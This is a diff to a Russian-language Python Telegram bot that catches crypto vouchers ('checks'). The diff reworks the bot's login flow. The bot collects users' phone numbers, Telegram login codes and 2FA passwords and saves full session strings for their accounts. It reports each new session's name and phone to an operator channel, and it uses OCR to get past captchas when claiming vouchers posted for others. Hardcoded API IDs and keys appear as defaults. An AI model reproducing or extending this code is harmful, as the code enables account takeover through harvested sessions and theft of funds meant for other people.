@@ -21,7 +21,7 @@ api_id = int(os.getenv('API_ID', '27258770'))
 api_hash = os.getenv('API_HASH', '')
 bot_token = os.getenv('BOT_TOKEN', '')
 channel = os.getenv('CHANNEL', '-1004902536707')
-ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))  # Ваш Telegram ID
+ADMIN_ID = int(os.getenv('ADMIN_ID', '0'))
 OCR_API_KEY = os.getenv('OCR_API_KEY', 'K88206317388957')
 ANTI_CAPTCHA = os.getenv('ANTI_CAPTCHA', 'True').lower() == 'true'
 
@@ -44,13 +44,13 @@ print("=" * 60)
 
 # ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
 executor = ThreadPoolExecutor(max_workers=3)
-user_data = {}  # Данные пользователей
-session_strings = {}  # Сохраненные сессии
-checks = []  # Найденные чеки
-wallet = []  # Чеки для wallet
-checks_count = 0  # Счетчик чеков
-captches = []  # Капчи
-active_catchers = {}  # Активные ловцы
+user_data = {}
+session_strings = {}
+checks = []
+wallet = []
+checks_count = 0
+captches = []
+active_catchers = {}
 
 # Регулярные выражения
 code_regex = re.compile(r"t\.me/(CryptoBot|send|tonRocketBot|CryptoTestnetBot|wallet|xrocket|xJetSwapBot)\?start=(CQ[A-Za-z0-9]{10}|C-[A-Za-z0-9]{10}|t_[A-Za-z0-9]{15}|mci_[A-Za-z0-9]{15}|c_[a-z0-9]{24})", re.IGNORECASE)
@@ -62,6 +62,83 @@ crypto_black_list = [1622808649, 1559501630, 1985737506, 5014831088, 6014729293,
 
 # Бот для управления
 bot = TelegramClient('lovec_bot', api_id, api_hash)
+
+# ========== УЛУЧШЕННАЯ СИСТЕМА ЛОГИНА ==========
+class LoginSystem:
+    """Улучшенная система логина"""
+    
+    def __init__(self):
+        self.login_attempts = {}
+        self.last_request_time = {}
+    
+    async def can_request_code(self, user_id, phone):
+        """Проверяет можно ли запросить код"""
+        now = time.time()
+        
+        # Очищаем старые записи
+        if user_id in self.last_request_time:
+            if now - self.last_request_time[user_id] < 300:  # 5 минут
+                return False, "⏳ Подождите 5 минут между запросами кода"
+        
+        self.last_request_time[user_id] = now
+        return True, "OK"
+    
+    async def request_code_safe(self, client, phone):
+        """Безопасный запрос кода с обработкой ошибок"""
+        try:
+            print(f"📞 Запрашиваю код для {phone}...")
+            
+            # Устанавливаем таймауты
+            client.session.set_dc(2, '149.154.167.40', 443)
+            
+            # Пробуем получить код
+            result = await client.send_code_request(
+                phone,
+                force_sms=False  # Не форсируем SMS
+            )
+            
+            print(f"✅ Код запрошен успешно!")
+            print(f"📱 Phone code hash: {result.phone_code_hash}")
+            
+            return {
+                'success': True,
+                'phone_code_hash': result.phone_code_hash,
+                'timeout': result.timeout
+            }
+            
+        except Exception as e:
+            error_msg = str(e)
+            print(f"❌ Ошибка запроса кода: {error_msg}")
+            
+            if "A wait of" in error_msg:
+                # Парсим время ожидания
+                wait_match = re.search(r"A wait of (\d+) seconds", error_msg)
+                if wait_match:
+                    wait_seconds = int(wait_match.group(1))
+                    if wait_seconds > 3600:
+                        return {
+                            'success': False,
+                            'error': f"⏳ Telegram ограничил запросы на {wait_seconds//3600} часов. Попробуйте позже."
+                        }
+                    else:
+                        return {
+                            'success': False,
+                            'error': f"⏳ Подождите {wait_seconds} секунд перед повторной попыткой."
+                        }
+            
+            elif "PHONE_NUMBER_INVALID" in error_msg:
+                return {'success': False, 'error': "❌ Неверный номер телефона"}
+            
+            elif "PHONE_NUMBER_BANNED" in error_msg:
+                return {'success': False, 'error': "🚫 Номер заблокирован в Telegram"}
+            
+            elif "PHONE_NUMBER_FLOOD" in error_msg:
+                return {'success': False, 'error': "⚠️ Слишком много запросов с этого номера"}
+            
+            else:
+                return {'success': False, 'error': f"❌ Ошибка: {error_msg[:100]}"}
+
+login_system = LoginSystem()
 
 # ========== ФУНКЦИИ OCR ==========
 def ocr_space_sync(file: bytes):
@@ -92,14 +169,14 @@ async def ocr_space(file: bytes):
     loop = asyncio.get_event_loop()
     return await loop.run_in_executor(executor, ocr_space_sync, file)
 
-# ========== ИНЛАЙН КЛАВИАТУРА ДЛЯ КОДА ==========
-def create_code_keyboard():
+# ========== ИНЛАЙН КЛАВИАТУРА ==========
+def create_code_keyboard(code=""):
     """Создает клавиатуру для ввода кода"""
     buttons = [
         [Button.inline("1", b"code_1"), Button.inline("2", b"code_2"), Button.inline("3", b"code_3")],
         [Button.inline("4", b"code_4"), Button.inline("5", b"code_5"), Button.inline("6", b"code_6")],
         [Button.inline("7", b"code_7"), Button.inline("8", b"code_8"), Button.inline("9", b"code_9")],
-        [Button.inline("0", b"code_0"), Button.inline("⌫", b"code_del"), Button.inline("✅", b"code_enter")]
+        [Button.inline("0", b"code_0"), Button.inline("⌫", b"code_del"), Button.inline("✅ Отправить", b"code_enter")]
     ]
     return buttons
 
@@ -148,9 +225,9 @@ async def login_handler(event):
     
     await event.reply(
         "📱 **Введите номер телефона:**\n\n"
-        "Пример: `+79123456789`\n"
-        "Или отправьте `cancel` для отмены\n\n"
-        "⚠️ **Важно:** Используйте тот же номер, что и в Telegram!"
+        "📌 **Формат:** `+79123456789` (с плюсом и кодом страны)\n"
+        "📌 **Пример:** `+79161234567`\n\n"
+        "Или отправьте `cancel` для отмены"
     )
     user_data[user_id] = {'state': 'waiting_phone'}
 
@@ -166,7 +243,10 @@ async def logout_handler(event):
         if user_id in user_data:
             del user_data[user_id]
         if user_id in active_catchers:
-            active_catchers[user_id].disconnect()
+            try:
+                await active_catchers[user_id].disconnect()
+            except:
+                pass
             del active_catchers[user_id]
         
         await event.reply("✅ Сессия удалена!")
@@ -226,7 +306,6 @@ async def start_catch_handler(event):
     
     # Запускаем ловлю в фоне
     asyncio.create_task(start_catching(user_id))
-    active_catchers[user_id] = None  # Заглушка
 
 @bot.on(events.NewMessage(pattern='/stop_catch'))
 async def stop_catch_handler(event):
@@ -291,21 +370,75 @@ async def message_handler(event):
         
         if state == 'waiting_phone':
             phone = text
-            await event.reply(
-                f"📱 Номер: `{phone}`\n\n"
-                f"📝 **Введите код из Telegram:**\n\n"
-                f"Используйте кнопки ниже или напишите код вручную\n"
-                f"Для отмены напишите `cancel`",
-                buttons=create_code_keyboard()
-            )
             
-            # Сохраняем телефон
-            user_data[user_id] = {
-                'state': 'waiting_code',
-                'phone': phone,
-                'code': '',
-                'code_timestamp': time.time()
-            }
+            # Проверяем формат номера
+            if not phone.startswith('+'):
+                await event.reply("❌ Номер должен начинаться с '+' (например: +79123456789)")
+                return
+            
+            if len(phone) < 10:
+                await event.reply("❌ Слишком короткий номер")
+                return
+            
+            # Проверяем можно ли запросить код
+            can_request, message = await login_system.can_request_code(user_id, phone)
+            if not can_request:
+                await event.reply(message)
+                return
+            
+            await event.reply(f"📱 Проверяю номер: `{phone}`...")
+            
+            # Создаем клиента
+            client = TelegramClient(StringSession(), api_id, api_hash)
+            
+            try:
+                await client.connect()
+                print(f"✅ Клиент подключен для {phone}")
+                
+                # Запрашиваем код
+                result = await login_system.request_code_safe(client, phone)
+                
+                if result['success']:
+                    # Сохраняем данные
+                    user_data[user_id] = {
+                        'state': 'waiting_code',
+                        'phone': phone,
+                        'client': client,
+                        'phone_code_hash': result['phone_code_hash'],
+                        'code': '',
+                        'timestamp': time.time()
+                    }
+                    
+                    await event.reply(
+                        f"✅ **Код отправлен!**\n\n"
+                        f"📱 Номер: `{phone}`\n"
+                        f"⏳ Время ожидания: {result.get('timeout', 120)} сек\n\n"
+                        f"📝 **Введите код из Telegram:**\n\n"
+                        f"Используйте кнопки ниже или напишите код вручную\n"
+                        f"Для отмены напишите `cancel`",
+                        buttons=create_code_keyboard()
+                    )
+                    
+                    # Сохраняем временного клиента
+                    user_data[user_id]['temp_client'] = client
+                    
+                else:
+                    await event.reply(f"❌ {result['error']}")
+                    await client.disconnect()
+                    if user_id in user_data:
+                        del user_data[user_id]
+                    
+            except Exception as e:
+                await event.reply(f"❌ Ошибка подключения: {e}")
+                if 'client' in locals():
+                    try:
+                        await client.disconnect()
+                    except:
+                        pass
+        
+        elif state == 'waiting_code' and len(text) >= 5:
+            # Пользователь ввел код текстом
+            await process_code_input(user_id, text, event)
 
 # ========== ОБРАБОТЧИК КНОПОК ==========
 @bot.on(events.CallbackQuery)
@@ -336,9 +469,10 @@ async def callback_handler(event):
             # Отправить код
             code = user_data[user_id]['code']
             if len(code) >= 5:  # Минимальная длина кода
-                await process_code(user_id, code, event)
+                await event.answer("⌛ Отправляю код...")
+                await process_code_input(user_id, code, event)
             else:
-                await event.answer("❌ Код слишком короткий!", alert=True)
+                await event.answer("❌ Код слишком короткий! Нужно минимум 5 цифр", alert=True)
             return
         
         else:
@@ -347,34 +481,37 @@ async def callback_handler(event):
                 user_data[user_id]['code'] += action
         
         # Обновляем сообщение
-        code_display = user_data[user_id]['code'] or "Введите код..."
+        code_display = user_data[user_id]['code'] or "____"
+        phone = user_data[user_id].get('phone', '')
+        
         await event.edit(
-            f"📱 Номер: `{user_data[user_id]['phone']}`\n\n"
+            f"📱 Номер: `{phone}`\n\n"
             f"📝 **Код:** `{code_display}`\n\n"
-            f"Используйте кнопки для ввода\n"
-            f"Для отмены напишите `cancel`",
+            f"Используйте кнопки для ввода (минимум 5 цифр)\n"
+            f"Нажмите ✅ Отправить когда код будет готов",
             buttons=create_code_keyboard()
         )
         
         await event.answer()
 
-async def process_code(user_id, code, event=None):
+async def process_code_input(user_id, code, event=None):
     """Обработка введенного кода"""
     try:
+        if user_id not in user_data:
+            await bot.send_message(user_id, "❌ Сессия истекла. Начните заново: /login")
+            return
+        
         phone = user_data[user_id]['phone']
+        phone_code_hash = user_data[user_id]['phone_code_hash']
+        client = user_data[user_id].get('temp_client')
         
-        await bot.send_message(user_id, "🔑 Подключаюсь к Telegram...")
+        if not client:
+            await bot.send_message(user_id, "❌ Клиент не найден. Начните заново: /login")
+            return
         
-        # Создаем клиента
-        client = TelegramClient(StringSession(), api_id, api_hash)
+        await bot.send_message(user_id, "🔑 Проверяю код...")
         
         try:
-            await client.connect()
-            
-            # Отправляем запрос на код
-            sent_code = await client.send_code_request(phone)
-            phone_code_hash = sent_code.phone_code_hash
-            
             # Пытаемся войти
             await client.sign_in(
                 phone=phone,
@@ -382,76 +519,77 @@ async def process_code(user_id, code, event=None):
                 phone_code_hash=phone_code_hash
             )
             
-            # Сохраняем сессию
-            session_string = client.session.save()
-            session_strings[user_id] = session_string
-            
-            # Получаем информацию о пользователе
-            me = await client.get_me()
-            
-            await bot.send_message(
-                user_id,
-                f"✅ **Успешная авторизация!**\n\n"
-                f"👤 Имя: {me.first_name}\n"
-                f"📱 Телефон: {me.phone}\n"
-                f"🆔 ID: <code>{me.id}</code>\n\n"
-                f"🎯 Теперь используйте `/start_catch` для ловли чеков",
-                parse_mode='HTML'
-            )
-            
-            # Отправляем в канал
-            try:
+            # Проверяем авторизацию
+            if await client.is_user_authorized():
+                # Сохраняем сессию
+                session_string = client.session.save()
+                session_strings[user_id] = session_string
+                
+                # Получаем информацию о пользователе
+                me = await client.get_me()
+                
                 await bot.send_message(
-                    channel,
-                    f"✅ **Новая сессия создана!**\n\n"
-                    f"👤 Пользователь: {me.first_name}\n"
+                    user_id,
+                    f"✅ **Успешная авторизация!**\n\n"
+                    f"👤 Имя: {me.first_name}\n"
                     f"📱 Телефон: {me.phone}\n"
-                    f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}"
+                    f"🆔 ID: <code>{me.id}</code>\n"
+                    f"🔗 @{me.username if me.username else 'нет'}\n\n"
+                    f"🎯 Теперь используйте `/start_catch` для ловли чеков\n"
+                    f"💾 Сессия сохранена автоматически",
+                    parse_mode='HTML'
                 )
-            except:
-                pass
-            
-            # Очищаем данные
-            if user_id in user_data:
-                del user_data[user_id]
-            
-            await client.disconnect()
-            
-            if event:
-                await event.answer("✅ Успешно!", alert=True)
-            
+                
+                # Отправляем в канал
+                try:
+                    await bot.send_message(
+                        channel,
+                        f"✅ **Новая сессия создана!**\n\n"
+                        f"👤 Пользователь: {me.first_name}\n"
+                        f"📱 Телефон: {me.phone}\n"
+                        f"⏰ Время: {datetime.now().strftime('%H:%M:%S')}"
+                    )
+                except:
+                    pass
+                
+                # Очищаем данные
+                if user_id in user_data:
+                    del user_data[user_id]
+                
+                # Отключаем временного клиента
+                await client.disconnect()
+                
+                if event:
+                    try:
+                        await event.answer("✅ Успешно!", alert=True)
+                        await event.delete()
+                    except:
+                        pass
+                
+            else:
+                await bot.send_message(user_id, "❌ Не удалось авторизоваться. Попробуйте снова: /login")
+                await client.disconnect()
+                
         except Exception as e:
             error_msg = str(e)
+            print(f"❌ Ошибка входа: {error_msg}")
+            
             if "PHONE_CODE_INVALID" in error_msg:
-                await bot.send_message(user_id, "❌ Неверный код. Попробуйте снова: /login")
+                await bot.send_message(user_id, "❌ Неверный код. Попробуйте снова или напишите `cancel`")
             elif "SESSION_PASSWORD_NEEDED" in error_msg:
                 await bot.send_message(user_id, "🔐 Нужен пароль 2FA. Введите пароль:")
-                user_data[user_id] = {'state': 'waiting_password', 'phone': phone, 'client': client}
-            elif "A wait of" in error_msg:
-                # Извлекаем время ожидания
-                wait_match = re.search(r"A wait of (\d+) seconds", error_msg)
-                if wait_match:
-                    wait_seconds = int(wait_match.group(1))
-                    if wait_seconds > 3600:  # Больше часа
-                        wait_time = f"{wait_seconds // 3600} часов"
-                    elif wait_seconds > 60:
-                        wait_time = f"{wait_seconds // 60} минут"
-                    else:
-                        wait_time = f"{wait_seconds} секунд"
-                    
-                    await bot.send_message(
-                        user_id,
-                        f"⏳ **Требуется ожидание:** {wait_time}\n\n"
-                        f"Telegram ограничил запросы для этого номера.\n"
-                        f"Подождите и попробуйте позже через /login"
-                    )
-                else:
-                    await bot.send_message(user_id, f"❌ Ошибка: {error_msg}")
+                user_data[user_id]['state'] = 'waiting_password'
+            elif "PHONE_CODE_EXPIRED" in error_msg:
+                await bot.send_message(user_id, "⏳ Код истек. Начните заново: /login")
+                if user_id in user_data:
+                    del user_data[user_id]
             else:
-                await bot.send_message(user_id, f"❌ Ошибка авторизации: {error_msg}")
+                await bot.send_message(user_id, f"❌ Ошибка: {error_msg[:100]}")
             
-            if 'client' in locals():
+            try:
                 await client.disconnect()
+            except:
+                pass
             
     except Exception as e:
         await bot.send_message(user_id, f"❌ Критическая ошибка: {e}")
@@ -482,7 +620,7 @@ async def start_catching(user_id):
         # Сохраняем клиента
         active_catchers[user_id] = client
         
-        # ========== ОПТИМИЗИРОВАННАЯ ЛОВЛЯ КАК В ВАШЕМ ПРИМЕРЕ ==========
+        # ========== ОПТИМИЗИРОВАННАЯ ЛОВЛЯ ==========
         
         @client.on(events.NewMessage(chats=crypto_black_list))
         async def handle_check_message(event):
@@ -652,8 +790,9 @@ async def main():
         print("📋 Инструкция:")
         print("1. Напишите боту /start")
         print("2. Используйте /login для входа")
-        print("3. Введите номер и код через клавиатуру")
-        print("4. Используйте /start_catch для ловли чеков")
+        print("3. Введите номер (+79123456789)")
+        print("4. Введите код через кнопки")
+        print("5. Используйте /start_catch для ловли чеков")
         print("=" * 60)
         
         await bot.run_until_disconnected()
